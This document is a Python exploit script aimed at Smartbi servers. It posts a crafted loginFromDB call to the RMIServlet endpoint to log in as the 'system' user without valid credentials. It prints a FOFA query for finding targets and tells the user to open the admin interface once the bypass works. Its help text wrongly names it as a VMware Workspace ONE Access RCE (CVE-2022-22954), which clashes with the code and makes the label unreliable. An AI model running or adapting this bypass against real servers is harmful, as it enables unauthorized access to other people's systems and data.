#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import re
import sys
import argparse
import requests

from requests.packages.urllib3.exceptions import InsecureRequestWarning


def title():
    print('+          FOFA:app="SMARTBI"')
    print('脚本验证通过之后再访问/smartbi/vision/index.jsp 路径即可进入界面')


def run_proto(url):
    requests.packages.urllib3.disable_warnings()
    path = [
        '/smartbi/vision/RMIServlet'
            ]
    for i in path:
        check_url = url + i
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0'}
        data = '''className=UserService&methodName=loginFromDB&params=["system","0a"]'''
        try:
            req = requests.post(url=check_url, data=data, headers=headers, timeout=(6, 6), allow_redirects=True, verify=False)
            rec = re.search('retCode.*?result.*?true.*?duration.?:[0-9]', req.text, re.I | re.M)
            if rec:
                print('{} is sExist'.format(url))
                print(req.text)
                return True
            else:
                return False

        except Exception as e:
            print(url + 'isnot')
            print(e)
            continue
    print(url + 'isnot')
    return False


def run(target):
    i = 0
    proto = ['http', 'https']
    while i < 2:
        url = '{}://{}'.format(proto[i], target)
        if run_proto(url):
            return True
        else:
            i = i + 1


if __name__ == '__main__':
    title()
    parser = argparse.ArgumentParser(description="CVE-2022-22954_VMware Workspace ONE Access RCE")
    parser.add_argument('-t', '--target', type=str, help='127.0.0.1:80', default='127.0.0.1:80')
    args = parser.parse_args()
    target = args.target

    result = run(target)

    if result:
        print('Exist')
    else:
        print('UnExist')